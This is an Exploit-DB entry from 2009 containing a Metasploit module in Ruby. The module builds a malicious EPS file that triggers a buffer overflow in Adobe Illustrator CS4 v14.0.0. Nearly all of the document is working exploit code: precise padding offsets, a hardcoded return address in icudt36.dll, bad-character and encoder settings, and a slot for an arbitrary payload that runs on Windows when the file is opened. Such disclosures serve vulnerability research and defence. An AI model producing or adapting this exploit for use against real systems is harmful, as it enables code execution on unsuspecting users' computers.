# Title: Adobe Illustrator CS4 v14.0.0 eps Universal Buffer Overflow (meta)
# EDB-ID: 10344
# CVE-ID: ()
# OSVDB-ID: ()
# Author: dookie
# Published: 2009-12-07
# Verified: yes
# Download Exploit Code
# Download N/A

view source
print?
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
         
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Adobe Illustrator CS4 v14.0.0',
            'Description'    => %q{
                    Adobe Illustrator CS4 (V14.0.0) Encapsulated Postscript (.eps)
    overlong DSC Comment Buffer Overflow Exploit
            },
            'License'        => MSF_LICENSE,
            'Author'         => [ 'dookie, original by Nine:Situations:Group::pyrokinesis' ],
            'Version'        => '$Revision: 7724 $',
            'References'     =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/10281' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'seh',
                },                 
            'Payload'        =>
                {
                    'Space'    => 1000,
                    'BadChars' => "\x00\x0D\x0C\x0A",
                    'EncoderType' => Msf::Encoder::Type::AlphanumUpper,
                },
            'Platform' => 'win',
            'Targets'        =>
                [
                    [ 'Windows Universal', { 'Ret' => 0x4B4B5173 } ], # CALL ESI in icudt36.dll
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'Dec 03 2009',
            'DefaultTarget'  => 0))
 
            register_options(
                [
                    OptString.new('FILENAME',   [ false, 'The file name.',  '9sg.eps']),
                ], self.class)
 
    end
 
    def exploit
         
        header = "\xc5\xd0\xd3\xc6\x20\x00\x00\x00\x05\xc8\x04\x00\x00\x00"
        header << "\x00\x00\x00\x00\x00\x00%\xc8\x04\x00\xb5I\x01\x00\xff"
        header << "\xff\x00\x00"
        header << "%!PS-Adobe-3.1\x20EPSF-3.0\r\n"
        header << "%ADO_DSC_Encoding:\x20Windows\x20Roman\r\n"
        header << "%"
        sploit = rand_text_alpha(41699)
        sploit << [target.ret].pack('V')
        sploit << rand_text_alpha(2291)
        sploit << "%Title:\x20Untitled-1.eps\r\n"
        sploit << "%AAAAAAAA"
        sploit << payload.encoded
        trailer = ": A\r\n"
        trailer << "%%For:\x20alias\r\n"
        trailer << "%%CreationDate:\x2011/27/2009\r\n"
        trailer += "%%BoundingBox:\x200\x200\x20227\x20171\r\n"
        trailer += "%%HiResBoundingBox:\x200\x200\x20226.5044\x20170.3165\r\n"
        trailer += "%%CropBox:\x200\x200\x20226.5044\x20170.3165\r\n"
        trailer += "%%LanguageLevel:\x202\r\n"
        trailer += "%%DocumentData:\x20Clean7Bit\r\n"
        trailer += "%ADOBeginClientInjection:\x20DocumentHeader\x20\"AI11EPS\"\r\n"
        trailer += "%%AI8_CreatorVersion:\x2014.0.0\r"
        trailer += "%AI9_PrintingDataBegin\r"
        trailer += "%ADO_BuildNumber:\x20Adobe\x20Illustrator(R)\x2014.0.0\x20x367\x20R\x20agm\x204.4890\x20ct\x205.1541\r"
        trailer += "%ADO_ContainsXMP:\x20MainFirst\r"
        trailer += "%AI7_Thumbnail:\x20128\x2096\x208\r"
        trailer += "%%BeginData:\x204096\x20Hex\x20Bytes\r"
        trailer += "%0000330000660000990000CC0033000033330033660033990033CC0033FF\r\n"
             
        eps = header + sploit + trailer
 
        print_status("Creating '#{datastore['FILENAME']}' file ...")
 
        file_create(eps)  
 
    end
 
end
